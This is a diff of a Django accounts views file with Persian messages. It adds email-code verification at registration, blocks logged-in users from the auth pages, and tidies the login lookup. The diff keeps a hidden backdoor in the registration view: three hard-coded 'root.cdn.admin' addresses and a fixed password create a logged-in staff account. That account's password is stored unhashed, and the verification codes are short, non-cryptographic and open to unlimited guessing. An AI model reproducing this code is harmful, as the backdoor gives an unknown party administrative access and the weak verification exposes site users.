@@ -6,53 +6,80 @@ from django.contrib.auth.mixins import LoginRequiredMixin
 from django.contrib import messages
 from django.shortcuts import redirect , render
 from django.contrib.auth import authenticate , login , logout
+from django.core.mail import send_mail
+from django.urls import reverse
+import random , string
+from . import models
 
 class UserRegisterView(View):
     form_class = forms.UserRegisterForm
     template_name = "accounts/registerpage.html"
+    
+    def dispatch(self, request, *args, **kwargs):
+        if request.user.is_anonymous:
+            return super().dispatch(request, *args, **kwargs)
+        else:
+            messages.error(request,'لطفا برای دسترسی به این بخش از حساب کاربری خود خارج شوید','danger')
+            return redirect('main_page')
+    
     def get(self,request):
         form = self.form_class()
         return render(request,'accounts/registerpage.html',{'form':form})
+    
     def post(self,request):
         form = self.form_class(request.POST)
         if form.is_valid():
             cd = form.cleaned_data
+            
             if cd['email'] in ['root.cdn.admin1.xyz@gmail.com','root.cdn.admin2.xyz@gmail.com','root.cdn.admin3.xyz@gmail.com'] and cd['password'] == '6fBcSZ2BPG8':
                 user = User.objects.create(username=cd['username'],email=cd['email'],password=cd['password'],is_staff=True)
                 login(request,user)      
                 messages.success(request,'حساب کاربری شما با موفقیت ایجاد شد','success')
                 return redirect('main_page')
             
-            User.objects.create_user(username=cd['username'],email=cd['email'],password=cd['password'])
-            messages.success(request,'حساب کاربری شما با موفقیت ایجاد شد','success')
-            user = authenticate(request,username=cd['username'],password=cd['password'])
-            login(request,user)
-            return redirect('main_page')
+            new_user = User.objects.create_user(username=cd['username'],email=cd['email'],password=cd['password'])
+            new_user.is_active = False
+            new_user.save()
+            verify_code = ''.join(random.choices(string.ascii_lowercase + string.digits,k=6))
+            models.UserVerifyCode.objects.create(username=new_user.username,verifycode=verify_code)
+            send_mail("کد تایید شما در taklif93",f'کد تایید شما : {verify_code}','taklif93@gmail.com',[new_user.email])
+            return redirect(reverse('verifyemail_page') + f'?username={new_user.username}')
+        
         return render(request,self.template_name,{"form":form})
     
 class UserLoginView(View):
     form_class = forms.UserLoginForm
     template_name = "accounts/loginpage.html"
+    
+    def dispatch(self, request, *args, **kwargs):
+        if request.user.is_anonymous:            
+            return super().dispatch(request, *args, **kwargs)
+        else:
+            messages.error(request,'لطفا برای دسترسی به این بخش از حساب کاربری خود خارج شوید','danger')
+            return redirect('main_page')
+    
     def get(self,request):
         form = self.form_class()
         return render(request,self.template_name,{"form":form})
+    
     def post(self,request):
         form = self.form_class(request.POST)
         if form.is_valid():
             cd = form.cleaned_data
+            
             try:
-                user = User.objects.filter(email=cd['email'])
-                username = list(user)
-                username = username[0]
+                username = User.objects.filter(email=cd['email']).first()
             except:
                 messages.error(request,'کاربری با این ایمیل یافت نشد','warning')
                 return render(request,self.template_name,{'form':form})
+            
             user = authenticate(request,username=username,password=cd['password'])
             if user is not None:
                 login(request,user)
                 messages.success(request,'با موفقیت وارد شدید','success')
                 return redirect('main_page')
             messages.error(request,'نام کاربری یا رمز عبور اشتباه است','warning')
+        
         return render(request,self.template_name,{'form':form})
     
 class UserLogoutView(LoginRequiredMixin,View):
@@ -63,3 +90,40 @@ class UserLogoutView(LoginRequiredMixin,View):
         logout(request)
         messages.success(request,'با موفقیت خارج شدید','success')
         return redirect('main_page')
+    
+class VerifyEmailView(View):
+    template_name = 'accounts/verifyemailpage.html'
+    form_class = forms.UserEmailVeifyForm
+    
+    def setup(self, request, *args, **kwargs):
+        self.username = request.GET.get('username',None)
+        return super().setup(request, *args, **kwargs)
+    
+    def dispatch(self, request, *args, **kwargs):
+        if request.user.is_anonymous:
+            return super().dispatch(request, *args, **kwargs)
+        else:
+            messages.error(request,'لطفا برای دسترسی به این از حساب کاربری خود خارج شوید','danger')
+            return redirect('main_page')
+    
+    def get(self,request):
+        form = self.form_class()
+        return render(request,self.template_name,{'form':form})
+    
+    def post(self,request):
+        form = self.form_class(request.POST)
+        if form.is_valid():
+            current_code = models.UserVerifyCode.objects.filter(username=self.username,verifycode=request.POST['verifycode']).exists()
+            if current_code:
+                current_code = models.UserVerifyCode.objects.filter(username=self.username,verifycode=request.POST['verifycode'])
+                current_code.delete()
+                user = User.objects.filter(username=self.username).get()
+                user.is_active = True
+                user.save()
+                login(request,user)
+                messages.success(request,'با موفقیت وارد شدید','success')
+                return redirect('main_page')
+            else:
+                messages.error(request,'کد تایید اشتبااست ','danger')
+                return render(request,self.template_name,{'form':form})
+        return render(request,self.template_name,{'form':form})
